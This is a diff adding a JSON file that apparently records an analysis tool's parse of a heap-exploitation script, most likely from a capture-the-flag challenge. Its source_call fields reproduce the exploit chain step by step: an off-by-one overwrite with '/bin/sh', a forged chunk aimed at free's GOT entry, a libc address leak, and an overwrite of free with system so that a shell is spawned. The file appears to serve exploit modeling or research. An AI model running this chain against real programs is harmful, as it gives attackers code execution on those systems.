@@ -1,0 +1,398 @@
+{
+  "run_id": "run-046548d2aa6a50ad",
+  "ops": [
+    {
+      "op_id": "op_001",
+      "kind": "alloc",
+      "handle": {
+        "kind": "unknown",
+        "reason": "handle not bound",
+        "source": ""
+      },
+      "menu_request": {
+        "kind": "concrete",
+        "ConcreteInt": 24,
+        "source": "24"
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "allocator request unproven",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length not bound",
+        "source": ""
+      },
+      "payload": {
+        "kind": "opaque",
+        "repr": "ConcreteBytes(value=b'dada', source=\"'dada'\")"
+      },
+      "source_line": 44,
+      "source_call": "create(0x18, \"dada\")",
+      "confidence": "structural",
+      "contract_id": "contract:a04085274d043607"
+    },
+    {
+      "op_id": "op_002",
+      "kind": "alloc",
+      "handle": {
+        "kind": "unknown",
+        "reason": "handle not bound",
+        "source": ""
+      },
+      "menu_request": {
+        "kind": "concrete",
+        "ConcreteInt": 16,
+        "source": "16"
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "allocator request unproven",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length not bound",
+        "source": ""
+      },
+      "payload": {
+        "kind": "opaque",
+        "repr": "ConcreteBytes(value=b'ddaa', source=\"'ddaa'\")"
+      },
+      "source_line": 45,
+      "source_call": "create(0x10, \"ddaa\")",
+      "confidence": "structural",
+      "contract_id": "contract:a04085274d043607"
+    },
+    {
+      "op_id": "op_003",
+      "kind": "edit",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 0,
+        "source": "0"
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request not bound",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "allocator request unproven",
+        "source": ""
+      },
+      "length": {
+        "kind": "concrete",
+        "ConcreteInt": 25,
+        "source": "len('/bin/sh\\x00' + 'a' * 16 + 'A')"
+      },
+      "payload": {
+        "kind": "opaque",
+        "repr": "ConcreteBytes(value=b'/bin/sh\\x00aaaaaaaaaaaaaaaaA', source=\"'/bin/sh\\\\x00' + 'a' * 16 + 'A'\")"
+      },
+      "source_line": 47,
+      "source_call": "edit(0, \"/bin/sh\\x00\" + \"a\" * 0x10 + \"\\x41\")",
+      "confidence": "structural",
+      "contract_id": "contract:b40a542d033d6121"
+    },
+    {
+      "op_id": "op_004",
+      "kind": "delete",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 1,
+        "source": "1"
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request not bound",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "allocator request unproven",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length not bound",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload not bound",
+        "source": ""
+      },
+      "source_line": 50,
+      "source_call": "delete(1)",
+      "confidence": "structural",
+      "contract_id": "contract:35e1660e0c8dc447"
+    },
+    {
+      "op_id": "op_005",
+      "kind": "alloc",
+      "handle": {
+        "kind": "unknown",
+        "reason": "handle not bound",
+        "source": ""
+      },
+      "menu_request": {
+        "kind": "concrete",
+        "ConcreteInt": 48,
+        "source": "48"
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "allocator request unproven",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length not bound",
+        "source": ""
+      },
+      "payload": {
+        "kind": "symbolic",
+        "SymbolicBytes": "p64(0) * 4 + p64(48) + p64(heap.got['free'])",
+        "source": ""
+      },
+      "source_line": 55,
+      "source_call": "create(0x30, p64(0) * 4 + p64(0x30) + p64(heap.got['free']))",
+      "confidence": "structural",
+      "contract_id": "contract:a04085274d043607"
+    },
+    {
+      "op_id": "op_006",
+      "kind": "show",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 1,
+        "source": "1"
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request not bound",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "allocator request unproven",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length not bound",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload not bound",
+        "source": ""
+      },
+      "source_line": 57,
+      "source_call": "show(1)",
+      "confidence": "structural",
+      "contract_id": "contract:ddde7f71bfb87808"
+    },
+    {
+      "op_id": "op_007",
+      "kind": "value",
+      "handle": {
+        "kind": "symbolic",
+        "SymbolicInt": "data",
+        "source": ""
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request absent",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 59,
+      "source_call": "data = r.recvuntil(\"Done !\")",
+      "confidence": "unknown",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_008",
+      "kind": "value",
+      "handle": {
+        "kind": "symbolic",
+        "SymbolicInt": "free_addr",
+        "source": ""
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request absent",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 61,
+      "source_call": "free_addr = u64(data.split(\"\\n\")[0].ljust(8, \"\\x00\"))",
+      "confidence": "unknown",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_009",
+      "kind": "value",
+      "handle": {
+        "kind": "symbolic",
+        "SymbolicInt": "libc_base",
+        "source": ""
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request absent",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 62,
+      "source_call": "libc_base = free_addr - libc.symbols['free']",
+      "confidence": "unknown",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_010",
+      "kind": "value",
+      "handle": {
+        "kind": "symbolic",
+        "SymbolicInt": "system_addr",
+        "source": ""
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request absent",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "menu request is not proof of allocator request",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length absent",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload absent",
+        "source": ""
+      },
+      "source_line": 64,
+      "source_call": "system_addr = libc_base + libc.symbols['system']",
+      "confidence": "unknown",
+      "contract_id": ""
+    },
+    {
+      "op_id": "op_011",
+      "kind": "edit",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 1,
+        "source": "1"
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request not bound",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "allocator request unproven",
+        "source": ""
+      },
+      "length": {
+        "kind": "concrete",
+        "ConcreteInt": 8,
+        "source": "len(p64(system_addr))"
+      },
+      "payload": {
+        "kind": "symbolic",
+        "SymbolicBytes": "p64(system_addr)",
+        "source": ""
+      },
+      "source_line": 67,
+      "source_call": "edit(1, p64(system_addr))",
+      "confidence": "structural",
+      "contract_id": "contract:b40a542d033d6121"
+    },
+    {
+      "op_id": "op_012",
+      "kind": "delete",
+      "handle": {
+        "kind": "concrete",
+        "ConcreteInt": 0,
+        "source": "0"
+      },
+      "menu_request": {
+        "kind": "unknown",
+        "reason": "menu request not bound",
+        "source": ""
+      },
+      "allocator_request": {
+        "kind": "unknown",
+        "reason": "allocator request unproven",
+        "source": ""
+      },
+      "length": {
+        "kind": "unknown",
+        "reason": "length not bound",
+        "source": ""
+      },
+      "payload": {
+        "kind": "unknown",
+        "reason": "payload not bound",
+        "source": ""
+      },
+      "source_line": 69,
+      "source_call": "delete(0)",
+      "confidence": "structural",
+      "contract_id": "contract:35e1660e0c8dc447"
+    }
+  ]
+}
